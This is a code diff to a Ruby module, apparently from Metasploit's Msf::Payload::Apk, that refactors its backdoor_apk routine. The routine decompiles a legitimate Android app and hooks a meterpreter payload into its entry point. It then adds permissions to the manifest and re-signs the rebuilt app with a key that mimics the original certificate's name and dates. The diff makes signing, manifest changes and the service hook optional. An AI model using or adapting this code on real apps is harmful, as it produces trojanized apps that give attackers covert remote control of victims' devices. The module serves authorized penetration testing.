@@ -140,25 +140,10 @@ class Msf::Payload::Apk
     return orig_cert_data
   end
 
-  def backdoor_apk(apkfile, raw_payload)
-    unless apkfile && File.readable?(apkfile)
+  def backdoor_apk(apkfile, raw_payload, signature = true, manifest = true, apk_data = nil, service = true)
+    unless apk_data || apkfile && File.readable?(apkfile)
       usage
       raise RuntimeError, "Invalid template: #{apkfile}"
-    end
-
-    keytool = run_cmd("keytool")
-    unless keytool != nil
-      raise RuntimeError, "keytool not found. If it's not in your PATH, please add it."
-    end
-
-    jarsigner = run_cmd("jarsigner")
-    unless jarsigner != nil
-      raise RuntimeError, "jarsigner not found. If it's not in your PATH, please add it."
-    end
-
-    zipalign = run_cmd("zipalign")
-    unless zipalign != nil
-      raise RuntimeError, "zipalign not found. If it's not in your PATH, please add it."
     end
 
     apktool = run_cmd("apktool -version")
@@ -173,24 +158,44 @@ class Msf::Payload::Apk
 
     #Create temporary directory where work will be done
     tempdir = Dir.mktmpdir
+    File.binwrite("#{tempdir}/payload.apk", raw_payload)
+    if apkfile
+      FileUtils.cp apkfile, "#{tempdir}/original.apk"
+    else
+      File.binwrite("#{tempdir}/original.apk", apk_data)
+    end
 
-    keystore = "#{tempdir}/signing.keystore"
-    storepass = "android"
-    keypass = "android"
-    keyalias = "signing.key"
-    orig_cert_data = parse_orig_cert_data(apkfile)
-    orig_cert_dname = orig_cert_data[0]
-    orig_cert_startdate = orig_cert_data[1]
-    orig_cert_validity = orig_cert_data[2]
+    if signature
+      keytool = run_cmd("keytool")
+      unless keytool != nil
+        raise RuntimeError, "keytool not found. If it's not in your PATH, please add it."
+      end
 
-    print_status "Creating signing key and keystore..\n"
-    run_cmd("keytool -genkey -v -keystore #{keystore} \
-    -alias #{keyalias} -storepass #{storepass} -keypass #{keypass} -keyalg RSA \
-    -keysize 2048 -startdate '#{orig_cert_startdate}' \
-    -validity #{orig_cert_validity} -dname '#{orig_cert_dname}'")
+      jarsigner = run_cmd("jarsigner")
+      unless jarsigner != nil
+        raise RuntimeError, "jarsigner not found. If it's not in your PATH, please add it."
+      end
 
-    File.open("#{tempdir}/payload.apk", "wb") {|file| file.puts raw_payload }
-    FileUtils.cp apkfile, "#{tempdir}/original.apk"
+      zipalign = run_cmd("zipalign")
+      unless zipalign != nil
+        raise RuntimeError, "zipalign not found. If it's not in your PATH, please add it."
+      end
+
+      keystore = "#{tempdir}/signing.keystore"
+      storepass = "android"
+      keypass = "android"
+      keyalias = "signing.key"
+      orig_cert_data = parse_orig_cert_data(apkfile)
+      orig_cert_dname = orig_cert_data[0]
+      orig_cert_startdate = orig_cert_data[1]
+      orig_cert_validity = orig_cert_data[2]
+
+      print_status "Creating signing key and keystore..\n"
+      run_cmd("keytool -genkey -v -keystore #{keystore} \
+      -alias #{keyalias} -storepass #{storepass} -keypass #{keypass} -keyalg RSA \
+      -keysize 2048 -startdate '#{orig_cert_startdate}' \
+      -validity #{orig_cert_validity} -dname '#{orig_cert_dname}'")
+    end
 
     print_status "Decompiling original APK..\n"
     run_cmd("apktool d #{tempdir}/original.apk -o #{tempdir}/original")
@@ -250,8 +255,13 @@ class Msf::Payload::Apk
       File.open(newfilename, "wb") {|file| file.puts smali }
     end
 
-    payloadhook = %Q^invoke-static {}, L#{package_slash}/#{classes['MainService']};->start()V
+    if service
+      hookfunction = "L#{package_slash}/#{classes['MainService']};->start()V"
+    else
+      hookfunction = "L#{package_slash}/#{classes['Payload']};->startContext()V"
+    end
 
+    payloadhook = %Q^invoke-static {}, #{hookfunction}
     ^ + entrypoint
     hookedsmali = hooksmali.sub(entrypoint, payloadhook)
 
@@ -260,20 +270,26 @@ class Msf::Payload::Apk
 
     injected_apk = "#{tempdir}/output.apk"
     aligned_apk = "#{tempdir}/aligned.apk"
-    print_status "Poisoning the manifest with meterpreter permissions..\n"
-    fix_manifest(tempdir, package, classes['MainService'], classes['MainBroadcastReceiver'])
+    if manifest
+      print_status "Poisoning the manifest with meterpreter permissions..\n"
+      fix_manifest(tempdir, package, classes['MainService'], classes['MainBroadcastReceiver'])
+    end
 
-    print_status "Rebuilding #{apkfile} with meterpreter injection as #{injected_apk}\n"
+    print_status "Rebuilding apk with meterpreter injection as #{injected_apk}\n"
     apktool_output = run_cmd("apktool b -o #{injected_apk} #{tempdir}/original")
     unless File.readable?(injected_apk)
       print_error apktool_output
       raise RuntimeError, "Unable to rebuild apk with apktool"
     end
 
-    print_status "Signing #{injected_apk}\n"
-    run_cmd("jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore #{keystore} -storepass #{storepass} -keypass #{keypass} #{injected_apk} #{keyalias}")
-    print_status "Aligning #{injected_apk}\n"
-    run_cmd("zipalign 4 #{injected_apk} #{aligned_apk}")
+    if signature
+      print_status "Signing #{injected_apk}\n"
+      run_cmd("jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore #{keystore} -storepass #{storepass} -keypass #{keypass} #{injected_apk} #{keyalias}")
+      print_status "Aligning #{injected_apk}\n"
+      run_cmd("zipalign 4 #{injected_apk} #{aligned_apk}")
+    else
+      aligned_apk = injected_apk
+    end
 
     outputapk = File.read(aligned_apk)
 
